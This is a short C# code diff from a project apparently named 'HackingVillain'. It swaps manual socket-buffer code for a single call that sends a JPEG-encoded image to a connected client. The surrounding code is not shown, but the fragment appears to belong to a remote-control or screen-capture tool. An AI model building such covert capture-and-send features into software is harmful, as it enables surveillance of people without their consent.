@@ -56,15 +56,7 @@ namespace HackingVillain
             using (var ms = new MemoryStream())
             {
                 img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
-                var bytes = ms.ToArray();
-                Buffer buf = Buffer.New();
-                Buffer.Add(buf, bytes.Length);
-                Buffer.FinalizeBuffer(buf);
-                AweSock.SendMessage(client, buf);
-                var buff = Buffer.New(bytes.Length);
-                Buffer.Add(buff, bytes);
-                Buffer.FinalizeBuffer(buff);
-                AweSock.SendMessage(client, buff);
+                Client.Send(client, ms.ToArray(), 7);
             }
         }
 
